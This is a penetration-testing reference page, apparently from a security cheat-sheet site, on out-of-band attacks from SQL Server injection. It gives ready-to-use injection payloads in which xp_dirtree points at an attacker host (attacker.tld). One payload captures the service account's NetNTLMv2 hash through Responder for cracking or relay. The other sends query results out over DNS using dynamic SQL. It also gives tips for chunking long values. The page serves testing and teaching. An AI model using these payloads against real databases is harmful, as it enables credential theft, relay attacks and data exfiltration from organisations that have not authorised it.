---
title: "Out-of-band exfiltration and hash capture from MSSQL injection"
description: "Using xp_dirtree and related UNC procedures in SQL Server to exfiltrate data over DNS and capture the service account's NetNTLM hash."
keywords:
  - out of band
  - xp_dirtree
  - UNC path
  - NetNTLM capture
  - DNS exfiltration
---

# Out-of-band

When nothing is reflected and timing is slow, SQL Server can be made to reach the network. Several extended procedures take a path argument and resolve it, so pointing one at an attacker UNC path triggers a DNS lookup and an SMB connection, which exfiltrates data in the hostname and leaks the service account's NetNTLM hash.

`xp_dirtree` is the common choice (often executable by lower-privileged logins, unlike `xp_cmdshell`):

```sql
'; EXEC master..xp_dirtree '\\attacker.tld\x'-- 
```

The SQL Server service account authenticates to the attacker SMB listener, and a tool such as Responder captures its NetNTLMv2 hash for cracking or relay. `xp_fileexist` and `xp_subdirs` behave the same way.

To carry data rather than just a credential, build the UNC hostname from the value to steal using dynamic SQL, so the attacker name server logs it over DNS. The inner argument must be a single-quoted string (doubled for the `EXEC` literal); double quotes would be read as a delimited identifier under the default `QUOTED_IDENTIFIER ON`:

```sql
'; DECLARE @d varchar(1024); SELECT @d=SYSTEM_USER; EXEC('master..xp_dirtree ''\\'+@d+'.attacker.tld\x''')-- 
```

The lookup of `<value>.attacker.tld` reaches the attacker's name server (for example Burp Collaborator), revealing the value after decoding. A DNS label is limited to 63 octets, so a short value like `SYSTEM_USER` or `DB_NAME()` fits in one lookup, but a long value such as a 142-character hash must be hex-encoded and split across labels or across several requests with `SUBSTRING`, one chunk per lookup. This route needs stacked queries for the dynamic version, and the hash-capture variant needs only `EXECUTE` on `xp_dirtree`, which makes it reachable even without `sysadmin`.

## Tools

- Responder
- impacket (`ntlmrelayx.py`)

## References

- Microsoft SQL Server Documentation: extended stored procedures
- OWASP Testing Guide: Testing for SQL Injection
